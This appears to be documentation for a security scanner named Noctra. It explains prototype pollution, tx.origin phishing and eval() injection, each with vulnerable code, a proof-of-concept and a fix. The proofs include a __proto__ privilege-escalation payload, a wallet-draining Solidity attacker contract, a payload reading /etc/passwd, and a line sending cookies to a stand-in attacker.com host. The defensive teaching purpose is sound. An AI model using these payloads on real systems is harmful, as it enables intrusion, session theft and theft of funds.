## 1. Prototype Pollution (JavaScript)

**Noctra Rule:** `PROTOTYPE_POLLUTION_AST`  
**Severity:** CRITICAL

### 📉 The Vulnerable Code
A common utility function that merges objects without sanitizing keys.

```javascript
// utils.js
function merge(target, source) {
  for (const key in source) {
    target[key] = source[key]; // ⚠️ Noctra flags this: No filter for __proto__!
  }
}

// server.js
let currentUser = { username: "user", role: "user" };
let userInput = JSON.parse(req.body); 
merge(currentUser, userInput);
```

### 💥 The Proof of Concept (PoC)
An attacker sends the following JSON payload to the `/update-profile` endpoint:

```json
{
  "__proto__": {
    "role": "admin"
  }
}
```

### 🔍 The Impact
After the payload is processed, any newly created empty object in the Node.js runtime will inherit the `role: "admin"` property.

```javascript
const newObject = {};
console.log(newObject.role); 
// OUTPUT: "admin"
```
**Result:** Privilege Escalation. The attacker gains admin access without authentication.

### 🛠️ The Fix
```javascript
function merge(target, source) {
  for (const key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue; // Block dangerous keys
    }
    target[key] = source[key];
  }
}
```

## 2. tx.origin Phishing (Solidity / Web3)

**Noctra Rule:** `TX_ORIGIN_AUTH`  
**Severity:** HIGH

### 📉 The Vulnerable Contract
A wallet contract that uses `tx.origin` for authorization.

```solidity
// VulnerableWallet.sol
contract VulnerableWallet {
    address public owner;

    constructor() { owner = msg.sender; }

    function withdraw(address payable recipient) public {
        require(tx.origin == owner, "Not owner"); // ⚠️ Noctra flags this!
        recipient.transfer(address(this).balance);
    }
}
```

### 💥 The Proof of Concept (PoC)
The attacker deploys a malicious contract and tricks the wallet owner into interacting with it.

```solidity
// AttackerContract.sol
contract AttackerContract {
    VulnerableWallet public wallet;

    constructor(address _walletAddress) {
        wallet = VulnerableWallet(_walletAddress);
    }

    function pwn() public {
        // When the owner calls this, tx.origin is the owner, 
        // but msg.sender is this AttackerContract.
        wallet.withdraw(payable(address(this))); 
    }
}
```

### 🔍 The Impact
1. Attacker deploys `AttackerContract` pointing to the victim's wallet.
2. Attacker tricks the victim into calling `pwn()` (e.g., via a fake "Claim NFT" button).
3. The victim's wallet executes `withdraw()`. Because `tx.origin` is the victim, the `require` check passes.
4. **Result:** The entire ETH balance of the victim's wallet is drained to the attacker's contract.

### 🛠️ The Fix
Always use `msg.sender` for authorization checks.
```solidity
require(msg.sender == owner, "Not owner"); 
```

## 3. eval() Injection (JavaScript)

**Noctra Rule:** `DANGEROUS_EVAL_AST`  
**Severity:** HIGH / CRITICAL

### 📉 The Vulnerable Code
A dynamic calculator or filter feature that executes user input directly.

```javascript
// calculator.js
function calculateFormula(userInput) {
  return eval(userInput); // ⚠️ Noctra flags this!
}
```

### 💥 The Proof of Concept (PoC)
The developer expects math like `"2 + 2"`. The attacker sends:

**Payload A (Server-Side RCE):**
```javascript
"2 + 2; require('fs').readFileSync('/etc/passwd')"
```

**Payload B (Client-Side XSS / Cookie Theft):**
```javascript
"2 + 2; document.location='https://attacker.com/?c='+document.cookie"
```

### 🔍 The Impact
`eval()` executes the string as native JavaScript code. 
**Result:** Remote Code Execution (RCE) on the server, or Session Hijacking (XSS) in the browser. The attacker can read sensitive files, steal databases, or take over user accounts.

### 🛠️ The Fix
Never use `eval()` with untrusted input.
- For math: Use a safe parser like `math.js`.
- For JSON: Use `JSON.parse()`.
- For dynamic logic: Use the `Function` constructor with strictly limited scope, or write a custom parser.
